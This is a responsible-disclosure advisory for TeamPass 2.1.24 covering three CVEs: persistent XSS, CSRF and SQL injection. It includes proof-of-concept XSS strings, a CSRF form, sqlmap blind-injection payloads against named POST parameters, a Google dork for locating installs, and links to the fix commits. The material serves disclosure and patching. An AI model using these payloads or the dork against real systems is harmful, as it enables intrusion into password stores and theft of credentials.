@@ -1,0 +1,80 @@
+Affected Product:    TeamPass
+Vulnerability Type:  	Multiple XSS,CSRF, SQL injections
+Fixed in Version:	2.1.25 (https://github.com/nilsteampassnet/TeamPass/releases/tag/2.1.25.0)
+Vendor Website:      	http://www.teampass.net
+Software Link: : 	https://github.com/nilsteampassnet/TeamPass
+Affected Version:	2.1.24 and prior 
+Vulnerable software (including source) : https://github.com/nilsteampassnet/TeamPass/releases/tag/2.1.24.4
+Google Dork: intitle:"Teampass" + inurl:index.php?page=items
+Tested on: Ubuntu
+Remote Exploitable:  Yes
+Reported to vendor:  30 december 2015
+Disclosed to public: 14 March 2016
+Release mode:        Responsible Disclosure
+CVE-2015-7562 TeamPass 2.1.24 Persistant XSS 
+CVE-2015-7563 TeamPass 2.1.24 CSRF 
+CVE-2015-7564 TeamPass 2.1.24 SQL Injection 
+Credits:              Vincent Malguy
+
+
+Description :
+TeamPass is a Passwords Manager dedicated for managing passwords in a collaborative way on any server Apache, MySQL and PHP. It is especially designed to provide passwords access security for allowed people. This makes TeamPass really useful in a Business/Enterprise environment and will provide to IT or Team Manager a powerful and easy tool for customizing passwords access depending on the user’s role. 
+Copyright (c) 2009-2015, Nils Laumaillé
+
+********************* CVE-2015-7562 TeamPass 2.1.24 Persistant XSS  *********************
+When displaying the detail of an item (a password entry), the "label" value is display using the stripslashes() sanitization function. This function does not efficiently  prevent XSS.
+POC of a persistant XSS : add  item with label : $str = "' onclick='javascript:alert("XSS found");' alt='";echo "<a href='". strip_tags($str) ."'></a>";
+This xss will be trigger each time a user click on this item. 
+As item can be share, there is a way for a user to trick an admin to trigger this xss.
+fix in commit cd112ea (see https://github.com/nilsteampassnet/TeamPass/pull/1140)
+
+POC of a persistant XSS : 
+Add a new role with name  : <script>alert("XSS");</script> 
+This xss will be trigger in many admin pages
+Fix in commit : 3f0a6c9 & e29cd54 & 295cada & 2c8a829 (see https://github.com/nilsteampassnet/TeamPass/pull/1140)
+
+********************* CVE-2015-7563 TeamPass 2.1.24 CSRF  *********************
+Lack of anti-CSRF token lead to security vulnerabilities where an attacker can trick a authenticated user to do some unwanted action on his behalf :
+
+<form action="http://<teampass host>/sources/main.queries.php" method="post">
+    <select name="type">
+    <option value="increase_session_time »>will add 1 hour timeout to the user session</option>
+</select>
+    <input type=submit>
+  </form> 
+  
+recommanded fix: add anti-CSRF token.
+
+********************* CVE-2015-7564 TeamPass 2.1.24 SQL Injections   *********************
+SQL injection has been found in item.query.php parameter id with type set to action_on_quick_icon.
+Sqlmap output  :
+---
+Parameter: id (POST)
+Type: boolean-based blind
+Title: MySQL >= 5.0 boolean-based blind - Parameter replace
+Payload: type=action_on_quick_icon&id=(SELECT (CASE WHEN (6144=6144) THEN 6144 ELSE 6144*(SELECT 6144 FROM INFORMATION_SCHEMA.CHARACTER_SETS) END))&action=1
+ —
+ fix in commit 795256f (see https://github.com/nilsteampassnet/TeamPass/pull/1140)
+
+
+SQL injections has been found in view.query.php in parameters order and direction with type set to connections_logs, errors_logs or access_logs .
+Note that direction need to be prefixed by ", "  in order to be exploitable
+Sqlmap output  for connections_logs:
+---
+Parameter: order (POST)
+    Type: boolean-based blind
+    Title: MySQL >= 5.0 boolean-based blind - Parameter replace
+    Payload: type=connections_logs&order=(SELECT (CASE WHEN (6688=6688) THEN 6688 ELSE 6688*(SELECT 6688 FROM INFORMATION_SCHEMA.CHARACTER_SETS) END))&direction=DESC
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (SELECT)
+    Payload: type=connections_logs&order=date AND (SELECT * FROM (SELECT(SLEEP(5)))vhPw)&direction=DESC
+—
+
+---
+Parameter: direction (POST)
+   Type: boolean-based blind
+   Title: MySQL >= 5.0 boolean-based blind - Parameter replace
+   Payload: type=errors_logs&order=date&direction=,  (SELECT (CASE WHEN (1739=1739) THEN 1739 ELSE 1739*(SELECT 1739 FROM INFORMATION_SCHEMA.CHARACTER_SETS) END))
+—
+fix commit 86719e0 (see https://github.com/nilsteampassnet/TeamPass/pull/1140)
